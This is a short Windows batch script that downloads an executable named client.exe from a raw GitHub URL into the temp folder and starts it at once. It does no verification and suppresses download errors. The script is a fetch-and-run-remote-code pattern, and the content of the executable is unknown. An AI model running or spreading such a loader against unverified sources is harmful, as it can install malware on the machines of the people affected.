@echo off
title Client Downloader & Launcher
set "EXE_URL=https://raw.githubusercontent.com/Maximus16adrianu/arduinotest/main/client.exe"
set "EXE_PATH=%temp%\client.exe"

echo Downloading client.exe...
powershell -Command "Invoke-WebRequest -Uri '%EXE_URL%' -OutFile '%EXE_PATH%'" 2>nul
if %errorlevel% neq 0 (
    echo Download failed. Exiting.
    pause
    exit /b 1
)

if not exist "%EXE_PATH%" (
    echo File not found. Exiting.
    pause
    exit /b 1
)

echo Starting client.exe...
start "" "%EXE_PATH%"
exit /b 0
